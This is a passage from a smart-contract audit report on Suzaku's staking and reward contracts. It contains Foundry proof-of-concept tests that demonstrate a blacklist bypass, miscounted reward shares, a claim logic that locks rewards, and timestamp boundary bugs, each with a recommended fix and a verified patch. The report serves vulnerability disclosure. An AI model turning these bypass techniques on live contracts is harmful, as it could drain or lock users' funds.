  // MockTokenizedVaultV3.sol
  function _migrate(uint64 oldVersion, uint64 newVersion, bytes calldata data) internal virtual onlyInitializing {
        // if (newVersion - oldVersion > 1) {
        //    revert();
        // }
        uint256 b_ = abi.decode(data, (uint256));
        b = b_;
    }

```

```solidity
    function testBlacklistDoesNotBlockMigration() public {
        // First, create a vault with version 1
        vault1 = vaultFactory.create(
            1, // version
            alice,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(collateral),
                    burner: address(0xdEaD),
                    epochDuration: 7 days,
                    depositWhitelist: false,
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: alice,
                    depositWhitelistSetRoleHolder: alice,
                    depositorWhitelistRoleHolder: alice,
                    isDepositLimitSetRoleHolder: alice,
                    depositLimitSetRoleHolder: alice,
                    name: "Test",
                    symbol: "TEST"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)

        );

        // Verify initial version
        assertEq(IVaultTokenized(vault1).version(), 1);

        // Blacklist version 2
        vaultFactory.blacklist(2);

        // Despite version 2 being blacklisted, we can still migrate to it!
        vm.prank(alice);
        // This should revert if blacklist was properly enforced, but it won't
        vaultFactory.migrate(vault1, 2, abi.encode(20));

        // Verify the vault is now at version 2, despite it being blacklisted
        assertEq(IVaultTokenized(vault1).version(), 2);

        // set the value of b inside MockVaultTokenizedV3 as 20
        assertEq(
            MockVaultTokenizedV3(vault1).version2State(),
            20);
    }
```

**Recommended Mitigation:** Consider adding a blacklist check to the migrate function to ensure consistency with the `create` function.

```diff solidity
function migrate(address entity_, uint64 newVersion, bytes calldata data) external checkEntity(entity_) {
    if (msg.sender != Ownable(entity_).owner()) {
        revert MigratableFactory__NotOwner();
    }

    if (newVersion <= IVaultTokenized(entity_).version()) {
        revert MigratableFactory__OldVersion();
    }

++    // Add this missing check
++    if (blacklisted[newVersion]) {
++       revert MigratableFactory__VersionBlacklisted();
++    }

    IMigratableEntityProxy(entity_).upgradeToAndCall(
        implementation(newVersion),
        abi.encodeCall(IVaultTokenized.migrate, (newVersion, data))
    );

    emit Migrate(entity_, newVersion);
}
```

**Suzaku:**
Fixed in [d3f98b8](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d3f98b82653ec3fa1f6f4b26049e9508cd9cda07).

**Cyfrin:** Verified.


### In `DelegatorFactory` new entity can be created for a blacklisted implementation

**Description:** The current implementation of `DelegatorFactory::create` fails to verify whether the specified implementation type has been explicitly blacklisted. This creates a security and consistency risk where blacklisted contract types can still be deployed, potentially bypassing governance or security restrictions.

**Impact:** The lack of a blacklist check in the create function allows the creation of contracts based on implementation types that may have been deemed unsafe, deprecated, or otherwise restricted.

**Proof of Concept:** Create a new test class `DelegatorFactoryTest.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
// SPDX-FileCopyrightText: Copyright 2024 ADDPHO

pragma solidity 0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {DelegatorFactory} from "../src/contracts/DelegatorFactory.sol";
import {IDelegatorFactory} from "../src/interfaces/IDelegatorFactory.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {IEntity} from "../../src/interfaces/common/IEntity.sol";
import {ERC165} from "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import "@openzeppelin/contracts/utils/introspection/IERC165.sol";

contract DelegatorFactoryTest is Test {
    address owner;
    address operator1;
    address operator2;

    DelegatorFactory factory;
    MockEntity mockImpl;

    function setUp() public {
        owner = address(this);
        operator1 = makeAddr("operator1");
        operator2 = makeAddr("operator2");

        factory = new DelegatorFactory(owner);

        // Deploy a mock implementation that conforms to IEntity
        mockImpl = new MockEntity(address(factory), 0);

        // Whitelist the implementation
        factory.whitelist(address(mockImpl));
    }

    function testCreateBeforeBlacklist() public {
        bytes memory initData = abi.encode("test");

        address created = factory.create(0, initData);

        assertTrue(factory.isEntity(created), "Entity should be created and registered");
    }

    function testCreateFailsAfterBlacklist() public {
        bytes memory initData = abi.encode("test");

        factory.blacklist(0);

        factory.create(0, initData); //@note no revert although blacklisted
    }
}

contract MockEntity is IEntity, ERC165 {
    address public immutable FACTORY;
    uint64 public immutable TYPE;

    string public data;

    constructor(address factory_, uint64 type_) {
        FACTORY = factory_;
        TYPE = type_;
    }

    function initialize(
        bytes calldata initData
    ) external {
        data = abi.decode(initData, (string));
    }

    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override(ERC165, IERC165) returns (bool) {
        return interfaceId == type(IEntity).interfaceId || super.supportsInterface(interfaceId);
    }
}

```

**Recommended Mitigation:** Consider adding the following check to the `DelagatorFactory::create`

```diff solidity
function create(uint64 type_, bytes calldata data) external returns (address entity_) {
++    if (blacklisted[type_]) {
++       revert DelagatorFactory__TypeBlacklisted();
++    }
        entity_ = implementation(type_).cloneDeterministic(keccak256(abi.encode(totalEntities(), type_, data)));

        _addDelegatorEntity(entity_);

        IEntity(entity_).initialize(data);
    }
```

**Suzaku:**
Fixed in commit [292d5b7](https://github.com/suzaku-network/suzaku-core/pull/155/commits/292d5b71ac3a377351d66f239405c4d38af53830).

**Cyfrin:** Verified.


### Incorrect summation of curator shares in `claimUndistributedRewards` leads to deficit in claimed undistributed rewards

**Description:** The `claimUndistributedRewards` function is designed to allow a `REWARDS_DISTRIBUTOR_ROLE` to collect any rewards for a specific `epoch` that were not claimed by stakers, operators, or curators. To do this, it calculates `totalDistributedShares`, representing the sum of all share percentages (in basis points) allocated to various participants.

```solidity
// Calculate total distributed shares for the epoch
uint256 totalDistributedShares = 0;

// Sum operator shares
address[] memory operators = l1Middleware.getAllOperators();
for (uint256 i = 0; i < operators.length; i++) {
    totalDistributedShares += operatorShares[epoch][operators[i]];
}

// Sum vault shares
address[] memory vaults = middlewareVaultManager.getVaults(epoch);
for (uint256 i = 0; i < vaults.length; i++) {
    totalDistributedShares += vaultShares[epoch][vaults[i]];
}

// Sum curator shares
for (uint256 i = 0; i < vaults.length; i++) {
    address curator = VaultTokenized(vaults[i]).owner();
    totalDistributedShares += curatorShares[epoch][curator];
}
```

The code iterates through all `vaults` active in the epoch. For each `vault`, it retrieves the `curator` (owner) and adds `curatorShares[epoch][curator]` to `totalDistributedShares`. However, the `curatorShares[epoch][curator]` mapping already stores the *total accumulated share* for that specific `curator` for that `epoch`, aggregated from all vaults they own and all operators those vaults delegated to.

```solidity
// First pass: calculate raw shares and total
for (uint256 i = 0; i < vaults.length; i++) {
    address vault = vaults[i];
    uint96 vaultAssetClass = middlewareVaultManager.getVaultAssetClass(vault);

    uint256 vaultStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
        l1Middleware.L1_VALIDATOR_MANAGER(), vaultAssetClass, operator, epochTs, new bytes(0)
    );

    if (vaultStake > 0) {
        uint256 operatorActiveStake =
            l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, vaultAssetClass);

        uint256 vaultShare = Math.mulDiv(vaultStake, BASIS_POINTS_DENOMINATOR, operatorActiveStake);
        vaultShare =
            Math.mulDiv(vaultShare, rewardsSharePerAssetClass[vaultAssetClass], BASIS_POINTS_DENOMINATOR);
        vaultShare = Math.mulDiv(vaultShare, operatorShare, BASIS_POINTS_DENOMINATOR);

        uint256 operatorTotalStake = l1Middleware.getOperatorStake(operator, epoch, vaultAssetClass);

        if (operatorTotalStake > 0) {
            uint256 operatorStakeRatio =
                Math.mulDiv(operatorActiveStake, BASIS_POINTS_DENOMINATOR, operatorTotalStake);
            vaultShare = Math.mulDiv(vaultShare, operatorStakeRatio, BASIS_POINTS_DENOMINATOR);
        }

        // Calculate curator share
        uint256 curatorShare = Math.mulDiv(vaultShare, curatorFee, BASIS_POINTS_DENOMINATOR);
        curatorShares[epoch][VaultTokenized(vault).owner()] += curatorShare;

        // Store vault share after removing curator share
        vaultShares[epoch][vault] += vaultShare - curatorShare;
    }
}
```

If a single curator owns multiple vaults that were active in the epoch, their *total* share (from `curatorShares[epoch][curator]`) is added to `totalDistributedShares` multiple timesonce for each vault they own. This artificially inflates the `totalDistributedShares` value.

**Impact:** The inflated `totalDistributedShares` leads to an underestimation of the actual `undistributedRewards`. The formula `undistributedRewards = totalRewardsForEpoch - Math.mulDiv(totalRewardsForEpoch, totalDistributedShares, BASIS_POINTS_DENOMINATOR)` will yield a smaller amount than what is truly undistributed.

Consequently:
1.  The `REWARDS_DISTRIBUTOR_ROLE` will claim a smaller amount of undistributed tokens than they are entitled to.
2.  The difference between the actual undistributed amount and the incorrectly calculated (smaller) amount will remain locked in the contract (unless it's upgraded) .

**Proof of Concept:**
```solidity
// 
// PoC  Incorrect Sum-of-Shares
// Shows that the sum of operator + vault + curator shares can exceed 10 000 bp
// (100 %), proving that `claimUndistributedRewards` will mis-count.
// 
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";

import {Rewards}           from "src/contracts/rewards/Rewards.sol";
import {MockUptimeTracker} from "../mocks/MockUptimeTracker.sol";
import {ERC20Mock}         from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

import {VaultTokenized}    from "src/contracts/vault/VaultTokenized.sol";

import {console2}          from "forge-std/console2.sol";
import {stdError}          from "forge-std/Test.sol";

contract PoCIncorrectSumOfShares is AvalancheL1MiddlewareTest {
    //  helpers & globals 
    MockUptimeTracker internal uptimeTracker;
    Rewards          internal rewards;
    ERC20Mock        internal rewardsToken;

    address internal REWARDS_MANAGER_ROLE     = makeAddr("REWARDS_MANAGER_ROLE");
    address internal REWARDS_DISTRIBUTOR_ROLE = makeAddr("REWARDS_DISTRIBUTOR_ROLE");

    uint96 secondaryAssetClassId = 2;          // activate a 2nd asset-class (40 % of rewards)

    // -----------------------------------------------------------------------
    //                      MAIN TEST ROUTINE
    // -----------------------------------------------------------------------
    function test_PoCIncorrectSumOfShares() public {
        _setupRewardsAndSecondaryAssetClass();          // 1. deploy + fund rewards

        address[] memory operators = middleware.getAllOperators();

        // 2. Alice creates *two* nodes (same stake reused) -------------------
        console2.log("Creating nodes for Alice");
        _createAndConfirmNodes(alice, 2, 100_000_000_001_000, true);

        // 3. Charlie is honest  single big node -----------------------------
        console2.log("Creating node for Charlie");
        _createAndConfirmNodes(charlie, 1, 150_000_000_000_000, true);

        // 4. Roll over so stakes are cached at epoch T ------------------------
        uint48 epoch = _calcAndWarpOneEpoch();
        console2.log("Moved to one epoch ");

        // Cache total stakes for primary & secondary classes
        middleware.calcAndCacheStakes(epoch, assetClassId);
        middleware.calcAndCacheStakes(epoch, secondaryAssetClassId);

        // 5. Give everyone perfect uptime so shares are fully counted --------
        for (uint i = 0; i < operators.length; i++) {
            uptimeTracker.setOperatorUptimePerEpoch(epoch,   operators[i], 4 hours);
            uptimeTracker.setOperatorUptimePerEpoch(epoch+1, operators[i], 4 hours);
        }

        // 6. Warp forward 3 epochs (rewards are distributable @ T-2) ---------
        _calcAndWarpOneEpoch(3);
        console2.log("Warped forward for rewards distribution");

        // 7. Distribute rewards ---------------------------------------------
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(operators.length));
        console2.log("Rewards distributed");

        // 8. Sum all shares and show bug (>10 000 bp) ------------------------
        uint256 totalShares = 0;

        // operator shares
        for (uint i = 0; i < operators.length; i++) {
            uint256 s = rewards.operatorShares(epoch, operators[i]);
            totalShares += s;
        }
        // vault shares
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            uint256 s = rewards.vaultShares(epoch, vaults[i]);
            totalShares += s;
        }
        // curator shares (may be double-counted!)
        for (uint i = 0; i < vaults.length; i++) {
            address curator = VaultTokenized(vaults[i]).owner();
            uint256 s = rewards.curatorShares(epoch, curator);
            totalShares += s;
        }
        console2.log("Total shares is greater than 10000 bp");

        assertGt(totalShares, 10_000);
    }

    // -----------------------------------------------------------------------
    //                      SET-UP HELPER
    // -----------------------------------------------------------------------
    function _setupRewardsAndSecondaryAssetClass() internal {
        uptimeTracker = new MockUptimeTracker();
        rewards       = new Rewards();

        // Initialise Rewards contract ---------------------------------------
        rewards.initialize(
            owner,                                  // admin
            owner,                                  // protocol fee recipient
            payable(address(middleware)),           // middleware
            address(uptimeTracker),                 // uptime oracle
            1000,                                   // protocol fee 10%
            2000,                                   // operator fee 20%
            1000,                                   // curator  fee 10%
            11_520                                  // min uptime (s)
        );

        // Assign roles -------------------------------------------------------
        vm.prank(owner);
        rewards.setRewardsManagerRole(REWARDS_MANAGER_ROLE);
        vm.prank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR_ROLE);

        // Mint & approve mock reward token ----------------------------------
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 ether);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 1_000_000 ether);

        // Fund 10 epochs of rewards -----------------------------------------
        vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(1, 10, address(rewardsToken), 100_000 * 1e18);
        vm.stopPrank();
        console2.log("Reward pool funded");

        // Configure 60 % primary / 40 % secondary split ---------------------
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1,                     6000); // 60 %
        rewards.setRewardsShareForAssetClass(secondaryAssetClassId, 4000); // 40 %
        vm.stopPrank();
        console2.log("Reward share split set: 60/40");

        // Create a secondary asset-class + vault so split is in effect
        _setupAssetClassAndRegisterVault(
            secondaryAssetClassId, 0,
            collateral2, vault3,
            type(uint256).max, type(uint256).max, delegator3
        );
        console2.log("Secondary asset-class & vault registered\n");
    }
}
```
**Output:**
```bash
Ran 1 test for test/middleware/PoCIncorrectSumOfShares.t.sol:PoCIncorrectSumOfShares
[PASS] test_PoCIncorrectSumOfShares() (gas: 8309923)
Logs:
  Reward pool funded
  Reward share split set: 60/40
  Secondary asset-class & vault registered

  Creating nodes for Alice
  Creating node for Charlie
  Moved to one epoch
  Warped forward for rewards distribution
  Rewards distributed
  Total shares is greater than 10000 bp

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.20ms (2.58ms CPU time)

Ran 1 test suite in 129.02ms (6.20ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** To correctly sum curator shares, ensure each curator's total share for the epoch is counted only once. This can be achieved by:

1.  **Tracking Unique Curators:** During the initial share calculation (e.g., in `_calculateAndStoreVaultShares`), maintain a data structure (like `EnumerableSet.AddressSet`) that stores the unique addresses of curators who earned shares in that epoch.
    ```solidity
     // Example: Add to state variables
     mapping(uint48 epoch => EnumerableSet.AddressSet) private _epochUniqueCurators;

     // In _calculateAndStoreVaultShares, after calculating curatorShare for a vault's owner:
     if (curatorShare > 0) {
         _epochUniqueCurators[epoch].add(VaultTokenized(vault).owner());
     }
    ```

2.  **Iterating Unique Curators in `claimUndistributedRewards`:** Modify the curator share summation loop to iterate over this set of unique curators.
    ```solidity
     // In claimUndistributedRewards:
     ...
     // Sum curator shares
     EnumerableSet.AddressSet storage uniqueCurators = _epochUniqueCurators[epoch];
     for (uint256 i = 0; i < uniqueCurators.length(); i++) {
         address curator = uniqueCurators.at(i);
         totalDistributedShares += curatorShares[epoch][curator];
     }
     ...
    ```
This ensures that `curatorShares[epoch][curatorAddress]` is added to `totalDistributedShares` precisely once for each distinct curator who earned rewards in the epoch.

**Suzaku:**
Fixed in commit [8f4adaa](https://github.com/suzaku-network/suzaku-core/pull/155/commits/8f4adaaca91402b1bde166f2d02c3ac9d72fc96c).

**Cyfrin:** Verified.




### Incorrect reward claim logic causes loss of access to intermediate epoch rewards

**Description:** In the current implementation of `Rewards::distributeRewards`, all shares are calculated for participants after a 3-epoch delay between the current epoch and the one being distributed. However, an issue arises in the **claim logic**.

When rewards are claimed for a past epoch, the `lastEpochClaimedOperator` is updated unconditionally to `currentEpoch - 1`. This can block claims for **intermediate epochs** that were not yet distributed at the time of the first claim.

**Problem Scenario**

Consider the following sequence:

1. **Epoch 4**: Rewards are distributed for **epoch 1**
2. **Epoch 5**: Operator1 claims rewards  `lastEpochClaimedOperator = 4`
3. **Epoch 5**: Rewards are now distributed for **epoch 2**
4. **Epoch 5**: Operator1 attempts to claim rewards for **epoch 2**, but it's **blocked** because `lastEpochClaimedOperator > 2`

As a result, the operator **loses access** to claimable rewards from epoch 2.

**Problematic Code**

```solidity
if (totalRewards == 0) revert NoRewardsToClaim(msg.sender);
IERC20(rewardsToken).safeTransfer(recipient, totalRewards);
lastEpochClaimedOperator[msg.sender] = currentEpoch - 1; // <-- Incorrectly skips intermediate epochs
```

**Impact:** **Loss of Funds**  Users (operators) are permanently prevented from claiming their legitimate rewards if intermediate epochs are distributed after a later claim has already advanced `lastEpochClaimedOperator`.

**Proof of Concept:** Add this test case to `RewardTest.t.sol` to reproduce the issue:

```solidity
function test_distributeRewards_claimFee(uint256 uptime) public {
    uint48 epoch = 1;
    uptime = bound(uptime, 0, 4 hours);

    _setupStakes(epoch, uptime);
    _setupStakes(epoch + 2, uptime);

    address[] memory operators = middleware.getAllOperators();
    uint256 batchSize = 3;
    uint256 remainingOperators = operators.length;

    vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
    while (remainingOperators > 0) {
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(batchSize));
        remainingOperators = remainingOperators > batchSize ? remainingOperators - batchSize : 0;
    }

    vm.warp((epoch + 4) * middleware.EPOCH_DURATION());

    for (uint256 i = 0; i < operators.length; i++) {
        uint256 operatorShare = rewards.operatorShares(epoch, operators[i]);
        if (operatorShare > 0) {
            vm.prank(operators[i]);
            rewards.claimOperatorFee(address(rewardsToken), operators[i]);
            assertGt(rewardsToken.balanceOf(operators[i]), 0, "Operator should receive rewards ");
            vm.stopPrank();
            break;
        }
    }

    vm.warp((epoch + 5) * middleware.EPOCH_DURATION());
    remainingOperators = operators.length;
    while (remainingOperators > 0) {
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch + 2, uint48(batchSize));
        remainingOperators = remainingOperators > batchSize ? remainingOperators - batchSize : 0;
    }

    vm.warp((epoch + 9) * middleware.EPOCH_DURATION());
    for (uint256 i = 0; i < operators.length; i++) {
        uint256 operatorShare = rewards.operatorShares(epoch + 2, operators[i]);
        if (operatorShare > 0) {
            vm.prank(operators[i]);
            rewards.claimOperatorFee(address(rewardsToken), operators[i]);
            vm.stopPrank();
            break;
        }
    }
}
```

**Recommended Mitigation:** Update the `claimOperatorFee` logic to **only update** `lastEpochClaimedOperator` to the **maximum epoch for which the user has successfully claimed rewards**, instead of always assigning `currentEpoch - 1`.

**Suzaku:**
Fixed in commit [6a0cbb1](https://github.com/suzaku-network/suzaku-core/pull/155/commits/6a0cbb1faa796e8925decad1ce9860eb20f184e7).

**Cyfrin:** Verified.




### Timestamp boundary condition causes reward dilution for active operators

**Description:** The `AvalancheL1Middleware::_wasActiveAt()` function contains a boundary condition bug that incorrectly treats operators and vaults as "active" at the exact timestamp when they are disabled. This causes disabled operators' stakes to be included in total stake calculations for reward distribution, leading to significant reward dilution for active operators.

The `_wasActiveAt()` function uses `>=` instead of `>` for the disabled time comparison:

```solidity
function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
    return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime >= timestamp); //@audit disabledTime >= timestamp means an operator is active at a timestamp when he was disabled
 }
```

When `disabledTime == timestamp`, the operator is incorrectly considered active, even though they were disabled at that exact moment.


This bug affects the `calcAndCacheStakes()` function used for reward calculations. Note that if the operator was disabled exactly at epoch start, the `totalStake` returns an inflated value as it includes the stake of disabled operator.

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 epochStartTs = getEpochStartTs(epoch);
    uint256 length = operators.length();

    for (uint256 i; i < length; ++i) {
        (address operator, uint48 enabledTime, uint48 disabledTime) = operators.atWithTimes(i);
        if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) { // @audit: this gets skipped
            continue;
        }
        uint256 operatorStake = getOperatorStake(operator, epoch, assetClassId);
        operatorStakeCache[epoch][assetClassId][operator] = operatorStake;
        totalStake += operatorStake; // @audit -> this is inflated
    }
    totalStakeCache[epoch][assetClassId] = totalStake;
    totalStakeCached[epoch][assetClassId] = true;
}
```

The same `_wasActiveAt()` function is used in `getOperatorStake()` when iterating through vaults. If a vault is disabled exactly at epoch start, it's incorrectly included in the operator's stake calculation:

```solidity
function getOperatorStake(address operator, uint48 epoch, uint96 assetClassId) public view returns (uint256 stake) {
    uint48 epochStartTs = getEpochStartTs(epoch);
    uint256 totalVaults = vaultManager.getVaultCount();

    for (uint256 i; i < totalVaults; ++i) {
        (address vault, uint48 enabledTime, uint48 disabledTime) = vaultManager.getVaultAtWithTimes(i);

        // Skip if vault not active in the target epoch
        if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) { // @audit: same boundary bug for vaults
            continue;
        }

        // Skip if vault asset not in AssetClassID
        if (vaultManager.getVaultAssetClass(vault) != assetClassId) {
            continue;
        }

        uint256 vaultStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
            L1_VALIDATOR_MANAGER, assetClassId, operator, epochStartTs, new bytes(0)
        );

        stake += vaultStake; // @audit -> inflated when disabled vaults are included
    }
}
```

In `Rewards::_calculateOperatorShare`, this inflated `totalStake` is then used to calculate operator share of rewards for that epoch.

```solidity
// In Rewards.sol - _calculateOperatorShare()
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    // ...
    for (uint256 i = 0; i < assetClasses.length; i++) {
        uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
        uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); // @audit inflated value

        uint256 shareForClass = Math.mulDiv(
            Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake), // @audit shares are diluted due to inflated total stake
            assetClassShare,
            BASIS_POINTS_DENOMINATOR
        );
        totalShare += shareForClass;
    }
    // ...
}
```

**Impact:** Rewards that were supposed to be distributed to active operators end up stuck in the Rewards contract. This leads to significant dilution of rewards for active operators and vaults.


**Proof of Concept:**
```solidity
   function test_wasActiveAtBoundaryBug() public {
        // create nodes for alice and charlie
        // Add nodes for Alice
        (bytes32[] memory aliceNodeIds,,) = _createAndConfirmNodes(alice, 1, 0, true);
        console2.log("Created", aliceNodeIds.length, "nodes for Alice");

        // Add nodes for Charlie
        (bytes32[] memory charlieNodeIds,,) = _createAndConfirmNodes(charlie, 1, 0, true);
        console2.log("Created", charlieNodeIds.length, "nodes for Charlie");

        // move to current epoch so that nodes are active
        // record next epoch start time stamp and epoch number
        uint48 currentEpoch = _calcAndWarpOneEpoch();
        uint48 nextEpoch = currentEpoch + 1;
        uint48 nextEpochStartTs = middleware.getEpochStartTs(nextEpoch);


        // Setup rewards contract (simplified version)
        address admin = makeAddr("admin");
        address protocolOwner = makeAddr("protocolOwner");
        address rewardsDistributor = makeAddr("rewardsDistributor");

        // Deploy rewards contract
        Rewards rewards = new Rewards();
        MockUptimeTracker uptimeTracker = new MockUptimeTracker();

        // Initialize rewards contract
        rewards.initialize(
            admin,
            protocolOwner,
            payable(address(middleware)),
            address(uptimeTracker),
            1000, // 10% protocol fee
            2000, // 20% operator fee
            1000, // 10% curator fee
            11520 // min required uptime
        );

        // Setup roles
        vm.prank(admin);
        rewards.setRewardsDistributorRole(rewardsDistributor);

        // Create rewards token and set rewards
        ERC20Mock rewardsToken = new ERC20Mock();
        uint256 totalRewards = 100 ether;
        rewardsToken.mint(rewardsDistributor, totalRewards);

         vm.startPrank(rewardsDistributor);
        rewardsToken.approve(address(rewards), totalRewards);
        rewards.setRewardsAmountForEpochs(nextEpoch, 1, address(rewardsToken), totalRewards);
        vm.stopPrank();

        // Set rewards share for primary asset class
        vm.prank(admin);
        rewards.setRewardsShareForAssetClass(1, 10000); // 100% for primary asset class

        // Record initial stake
        uint256 aliceInitialStake = middleware.getOperatorStake(alice, currentEpoch, assetClassId);
        uint256 charlieInitialStake = middleware.getOperatorStake(charlie, currentEpoch, assetClassId);

        // Verify they have nodes
        bytes32[] memory aliceCurrentNodes = middleware.getActiveNodesForEpoch(alice, currentEpoch);
        bytes32[] memory charlieCurrentNodes = middleware.getActiveNodesForEpoch(charlie, currentEpoch);
        console2.log("Alice current nodes:", aliceCurrentNodes.length);
        console2.log("Charlie current nodes:", charlieCurrentNodes.length);

        console2.log("=== INITIAL STATE ===");
        console2.log("Alice initial stake:", aliceInitialStake);
        console2.log("Charlie initial stake:", charlieInitialStake);
        console2.log("Total initial:", aliceInitialStake + charlieInitialStake);


        // Move to exact epoch boundary and disable Alice
        vm.warp(nextEpochStartTs);
        vm.prank(validatorManagerAddress);
        middleware.disableOperator(alice);

        // Set uptime alice - 0, charlie - full
        uptimeTracker.setOperatorUptimePerEpoch(nextEpoch, alice, 0 hours);
        uptimeTracker.setOperatorUptimePerEpoch(nextEpoch, charlie, 4 hours);

        // Calculate stakes for the boundary epoch
        uint256 aliceBoundaryStake = middleware.getOperatorStake(alice, nextEpoch, assetClassId);
        uint256 charlieBoundaryStake = middleware.getOperatorStake(charlie, nextEpoch, assetClassId);
        uint256 totalBoundaryStake = middleware.calcAndCacheStakes(nextEpoch, assetClassId);

        console2.log("=== BOUNDARY EPOCH ===");
        console2.log("Epoch start timestamp:", nextEpochStartTs);
        console2.log("Alice disabled at timestamp:", nextEpochStartTs);
        console2.log("Alice boundary stake:", aliceBoundaryStake);
        console2.log("Charlie boundary stake:", charlieBoundaryStake);
        console2.log("Total boundary stake:", totalBoundaryStake);


       // Distribute rewards using actual Rewards contract
        vm.warp(nextEpochStartTs + 3 * middleware.EPOCH_DURATION()); // Move past distribution window

        vm.prank(rewardsDistributor);
        rewards.distributeRewards(nextEpoch, 10); // Process all operators

        // Move to claiming period
        vm.warp(nextEpochStartTs + 4 * middleware.EPOCH_DURATION());

        // Record balances before claiming
        uint256 rewardsContractBalance = rewardsToken.balanceOf(address(rewards));
        uint256 charlieBalanceBefore = rewardsToken.balanceOf(charlie);

        console2.log("=== UNDISTRIBUTED REWARDS TEST ===");
        console2.log("Total rewards in contract:", rewardsContractBalance);

        // Charlie claims his rewards
        vm.prank(charlie);
        rewards.claimOperatorFee(address(rewardsToken), charlie);

        uint256 charlieRewards = rewardsToken.balanceOf(charlie) - charlieBalanceBefore;
        console2.log("Charlie claimed:", charlieRewards);

        // Alice cannot claim (disabled/no uptime)
        vm.expectRevert();
        vm.prank(alice);
        rewards.claimOperatorFee(address(rewardsToken), alice);

        // Charlie should get 100% of operator rewards
        // Deduct protocol share - and calculate operator fees
        uint256 charliExpectedRewards = totalRewards * 9000 * 2000 / 100_000_000; // (total rewards - protocol share) * operator fee
        assertGt(charliExpectedRewards, charlieRewards);
    }
```

**Recommended Mitigation:** Consider changing the boundary condition in `_wasActiveAt()` to exclude operators disabled at exact timestamp.

**Suzaku:**
Fixed in commit [9bbbcfc](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9bbbcfce7bedd1dd4e60fdf55bb5f13ba8ab4847).

**Cyfrin:** Verified.


###  Immediate stake cache updates enable reward distribution without P-Chain confirmation

**Description:** The middleware immediately updates stake cache for reward calculations when operators initiate stake changes via `initializeValidatorStakeUpdate()`, even though these changes remain unconfirmed by the P-Chain.

This creates a temporal window where reward calculations diverge from the actual validated P-Chain state, potentially allowing operators to receive rewards based on unconfirmed stake increases.

When an operator calls `initializeValidatorStakeUpdate()` to modify their validator's stake, the middleware immediately updates the stake cache for the next epoch:

```solidity
// In initializeValidatorStakeUpdate():
function _initializeValidatorStakeUpdate(address operator, bytes32 validationID, uint256 newStake) internal {
    uint48 currentEpoch = getCurrentEpoch();

    nodeStakeCache[currentEpoch + 1][validationID] = newStake;
    nodePendingUpdate[validationID] = true;

    // @audit P-Chain operation initiated but NOT confirmed
    balancerValidatorManager.initializeValidatorWeightUpdate(validationID, scaledWeight);
}
```
However, reward calculations immediately use this cached stake without verifying P-Chain confirmation:

```solidity
function getOperatorUsedStakeCachedPerEpoch(uint48 epoch, address operator, uint96 assetClass) external view returns (uint256) {
    // Uses cached stake regardless of P-Chain confirmation status
    bytes32[] memory nodesArr = this.getActiveNodesForEpoch(operator, epoch);
    for (uint256 i = 0; i < nodesArr.length; i++) {
        bytes32 nodeId = nodesArr[i];
        bytes32 validationID = balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        registeredStake += getEffectiveNodeStake(epoch, validationID); // @audit Uses unconfirmed stake
    }
```

It is worthwhile to note that the middleware explicitly skips validators with pending updates in the `forceUpdateNodes`:

```solidity
function forceUpdateNodes(address operator, uint256 limitStake) external {
    // ...
    for (uint256 i = length; i > 0 && leftoverStake > 0;) {
        bytes32 valID = balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        if (balancerValidatorManager.isValidatorPendingWeightUpdate(valID)) {
            continue; // @audit No correction possible for pending validators
        }
        // ... stake adjustment logic
    }
}
```
This creates an inconsistent approach - while rebalancing nodes, logic is verifying the P-chain state while the same check is missing for reward estimation.


**Impact:**
- Operators receive immediate reward boosts upon submitting stake increases, before P-Chain validation
- P-chain may reject operations or take multiple epochs to confirm causing an inconsistency in L1 Middleware state and P-chain state

**Proof of Concept:** Current POC shows that the reward calculation uses unconfirmed stake updates. Add to `AvalancheMiddlewareTest.t.sol`

```solidity
    function test_UnconfirmedStakeImmediateRewards() public {
        // Setup: Alice has 100 ETH equivalent stake
        uint48 epoch = _calcAndWarpOneEpoch();

        // increasuing vaults total stake
